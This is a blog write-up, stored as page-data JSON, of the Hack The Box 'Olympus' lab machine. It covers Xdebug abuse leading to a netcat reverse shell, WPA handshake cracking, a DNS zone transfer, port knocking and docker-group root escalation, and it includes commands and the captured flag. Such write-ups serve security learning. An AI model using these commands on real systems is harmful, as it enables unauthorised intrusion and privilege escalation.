{"data":{"markdownRemark":{"html":"<p>I begun by scanning the box to find some interesting ports.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">PORT     STATE    SERVICE VERSION\n22/tcp   filtered ssh\n53/tcp   open     domain  (unknown banner: Bind)\n80/tcp   open     http    Apache httpd\n2222/tcp open     ssh     (protocol 2.0)</code></pre></div>\n<p>Port 80 was open so I visited the site and found a picture of the almighty God Zeus. I checked the response headers in the developer console and noticed the <code class=\"language-text\">xdebug</code> variable. According to my google fu, it's a PHP debugger which among other things, can be used to debug <a href=\"https://xdebug.org/docs/remote\"><em>remote</em></a> PHP applications. </p>\n<p>I continued to recon the web for more info and found the following links:</p>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/pull/9916\">https://github.com/rapid7/metasploit-framework/pull/9916</a></p>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/pull/9916\">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></p>\n<p>I used the script found in the last link. All you need to do is to setup a GET parameter and specify your attack IP in <code class=\"language-text\">X-FORWARDED-FOR</code>. I ran the <code class=\"language-text\">xdebug.py</code> script and sent the following HTTP request:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">GET /index.php?XDEBUG_SESSION_START=phpstorm HTTP/1.1\nHost: 10.10.10.83\nUser-Agent: Mozilla/5.0 (X11; Windows x86_64; rv:59.0) Gecko/20100101 Firefox/59.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nX-FORWARDED-FOR: 10.10.14.7\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0</code></pre></div>\n<p>The machine connected back to my attack machine! Next I setup a listener <code class=\"language-text\">nc -lvp 1337</code> and ran the following command from <code class=\"language-text\">xdebug.py</code>: <code class=\"language-text\">system(&quot;nc -e /bin/bash 10.10.10.14.7 1337&quot;)</code> which ran on the victim's box and created a reverse shell for me to use.</p>\n<h3 id=\"whats-in-the-box\"><a href=\"#whats-in-the-box\" aria-label=\"whats in the box permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WHAT'S IN THE BOX!?!?</h3>\n<p>After gaining access I looked for <code class=\"language-text\">user.txt</code> but couldn't find it. After checking the home folder of <code class=\"language-text\">zeus</code>, checking the process list with <code class=\"language-text\">ps aux</code> and checking the root directory, I started to think this must be a docker container. I uploaded <code class=\"language-text\">linenum.sh</code> which later also reported to believe that the host was actually a docker container.</p>\n<p>The user <code class=\"language-text\">zeus</code> had downloaded the project <code class=\"language-text\">airgeddon</code> from github which is a tool for attacking wireless networks. Inside the project I found a .pcap file and a .txt file with the following message:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Captured while flying. I&#39;ll banish him to Olympia - Zeus</code></pre></div>\n<p>I opened the .pcap file and realised it was encrypted WLAN traffic, so I fired up <code class=\"language-text\">aircrack-ng</code> and got crackin! After 40 minutes using <code class=\"language-text\">rockyou.txt</code> as my wordlist, I found the password: <code class=\"language-text\">flightoficarus</code>. Inside the .pcap I could see clients connecting to an accesspoint called: <code class=\"language-text\">Too_cl0se_to_th3_Sun</code>.</p>\n<p>I continued to scan the .pcap for more information but couldn't find anything. So I begun trying to SSH into the machine at port 2222 with different credentials, using greek mythology as my starting point. Everything I tried failed. One week later I try the same credentials again and voila, I had access. Why this didn't work the first time, I don't know. My guess is that people were hammering the machine hard so I timed out.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">icarus:Too_cl0se_to_th3_Sun</code></pre></div>\n<p>Turned out this was an other docker container, I deduced that from the hostname and process list. There was only one file available, which had the following contents:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Athena goddess will guide you through the dark...\n\nWay to Rhodes...\nctfolympus.htb</code></pre></div>\n<p>Okey, so now I have a new domain, and port 53/tcp was open according to my port scan, that can only mean one thing...DNS ZONE TRANSFER!</p>\n<p>First I ran the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">root@kali:~/Sites/htb-notes/olympus/http_serve# host -l ctfolympus.htb 10.10.10.83\nUsing domain server:\nName: 10.10.10.83\nAddress: 10.10.10.83#53\nAliases: \n\nctfolympus.htb has address 192.168.0.120\nctfolympus.htb name server ns1.ctfolympus.htb.\nctfolympus.htb name server ns2.ctfolympus.htb.\nmail.ctfolympus.htb has address 192.168.0.120\nns1.ctfolympus.htb has address 192.168.0.120\nns2.ctfolympus.htb has address 192.168.0.120</code></pre></div>\n<p>Okey nice, lets run the dns zone transfer!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">root@kali:~/Sites/htb-notes/olympus/http_serve# dig axfr @ctfolympus.htb ctfolympus.htb\n\n; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; axfr @ctfolympus.htb ctfolympus.htb\n; (1 server found)\n;; global options: +cmd\nctfolympus.htb.\t\t86400\tIN\tSOA\tns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400\nctfolympus.htb.\t\t86400\tIN\tTXT\t&quot;prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!&quot;\nctfolympus.htb.\t\t86400\tIN\tA\t192.168.0.120\nctfolympus.htb.\t\t86400\tIN\tNS\tns1.ctfolympus.htb.\nctfolympus.htb.\t\t86400\tIN\tNS\tns2.ctfolympus.htb.\nctfolympus.htb.\t\t86400\tIN\tMX\t10 mail.ctfolympus.htb.\ncrete.ctfolympus.htb.\t86400\tIN\tCNAME\tctfolympus.htb.\nhades.ctfolympus.htb.\t86400\tIN\tCNAME\tctfolympus.htb.\nmail.ctfolympus.htb.\t86400\tIN\tA\t192.168.0.120\nns1.ctfolympus.htb.\t86400\tIN\tA\t192.168.0.120\nns2.ctfolympus.htb.\t86400\tIN\tA\t192.168.0.120\nrhodes.ctfolympus.htb.\t86400\tIN\tCNAME\tctfolympus.htb.\nRhodesColossus.ctfolympus.htb. 86400 IN\tTXT\t&quot;Here lies the great Colossus of Rhodes&quot;\nwww.ctfolympus.htb.\t86400\tIN\tCNAME\tctfolympus.htb.\nctfolympus.htb.\t\t86400\tIN\tSOA\tns1.ctfolympus.htb. ns2.ctfolympus.htb. 2018042301 21600 3600 604800 86400\n;; Query time: 46 msec\n;; SERVER: 10.10.10.83#53(10.10.10.83)\n;; WHEN: Mon May 14 19:27:19 CEST 2018\n;; XFR size: 15 records (messages 1, bytes 475)</code></pre></div>\n<p>DNS zone transfer lets us get a copy of the zone file, so now we can see everything! The thing that stood out the most was:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">ctfolympus.htb.\t\t86400\tIN\tTXT\t&quot;prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!&quot;</code></pre></div>\n<p>My thinking here was that the user <code class=\"language-text\">prometheus</code> needs to perform port knocking which will then open allow us to login via ssh on port 22, which was set to filtered according to my port scan.</p>\n<p>Easy peasy one liner:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">for port in 3456 8234 62431; do nc ctfolympus.htb $port 2&gt; /dev/null; done; sshpass -p &#39;St34l_th3_F1re!&#39; ssh -o &quot;StrictHostKeyChecking no&quot; prometheus@ctfolympus.htb</code></pre></div>\n<p><code class=\"language-text\">sshpass</code> is a package which allows you to set the SSH password as an input parameter.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Welcome to\n                            \n    <span class=\"token punctuation\">)</span>         <span class=\"token punctuation\">(</span>             \n <span class=\"token punctuation\">(</span> /<span class=\"token punctuation\">(</span>     <span class=\"token punctuation\">)</span>   <span class=\"token punctuation\">)</span>\\ <span class=\"token punctuation\">)</span>   <span class=\"token punctuation\">(</span>      \n <span class=\"token punctuation\">)</span>\\<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span> <span class=\"token punctuation\">(</span> /<span class=\"token punctuation\">(</span>  <span class=\"token variable\"><span class=\"token punctuation\">((</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token punctuation\">(</span>  <span class=\"token punctuation\">))</span></span>\\ <span class=\"token punctuation\">(</span>   \n<span class=\"token variable\"><span class=\"token punctuation\">((</span>_<span class=\"token punctuation\">)</span>\\  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">))</span></span>  <span class=\"token variable\"><span class=\"token punctuation\">((</span>_<span class=\"token punctuation\">))</span></span>/<span class=\"token variable\"><span class=\"token punctuation\">((</span>_<span class=\"token punctuation\">))</span></span>\\  \n<span class=\"token operator\">|</span> <span class=\"token operator\">|</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span><span class=\"token variable\"><span class=\"token punctuation\">((</span>_<span class=\"token punctuation\">)</span>_   _<span class=\"token operator\">|</span> <span class=\"token operator\">|</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">))</span></span> <span class=\"token punctuation\">((</span>_<span class=\"token punctuation\">)</span> \n<span class=\"token operator\">|</span> ' \\ / _<span class=\"token variable\"><span class=\"token variable\">`</span> <span class=\"token operator\">|</span>/ _<span class=\"token variable\">`</span></span> <span class=\"token operator\">|</span>/ -_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_-<span class=\"token operator\">&lt;</span> \n<span class=\"token operator\">|</span>_<span class=\"token operator\">||</span>_<span class=\"token operator\">|</span>\\__,_<span class=\"token operator\">|</span>\\__,_<span class=\"token operator\">|</span>\\___<span class=\"token operator\">|</span>/__/ \n                           \nprometheus@olympus:~$</code></pre></div>\n<p>Aww yeee, we got access to the host machine and not some stupid container! Since I knew the host was running docker, I tried some commands to see what I could do, and to my surprise, I could do anything!</p>\n<p>In order to get <code class=\"language-text\">root.txt</code>, all we need to do is to simply start a container and map root's home directory into the container. First I tried to use a ubuntu image but that didn't work, so I checked <code class=\"language-text\">docker images</code> and picked one from there.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">prometheus@olympus:~$ docker run --volume=/root:/volumes -i -t olympia /bin/bash\nroot@1c2a720c4fa5:/#\nroot@1c2a720c4fa5:/# ls /volumes/\nroot.txt\nroot@1c2a720c4fa5:/# cat /volumes/root.txt \naba486990e2e849e25c23f6e41e5e303\nroot@1c2a720c4fa5:/#</code></pre></div>\n<p>And there you go.</p>","timeToRead":6,"excerpt":"I begun by scanning the box to find some interesting ports. Port 80 was open so I visited the site and found a picture of the almighty God…","frontmatter":{"title":"Hack The Box - Olympus Writeup","slug":"htb-olympus-writeup","date":"2019-08-15T00:00:00.000Z","categories":["HTB"],"tags":["HTB"],"template":"post"},"fields":{"nextTitle":"My OSCP Review","nextSlug":"/my-oscp-review/","prevTitle":"No Such Agency","prevSlug":"/no-such-agency/","slug":"/htb-olympus-writeup/","date":"2019-08-15T00:00:00.000Z"}}},"pageContext":{"slug":"/htb-olympus-writeup/"}}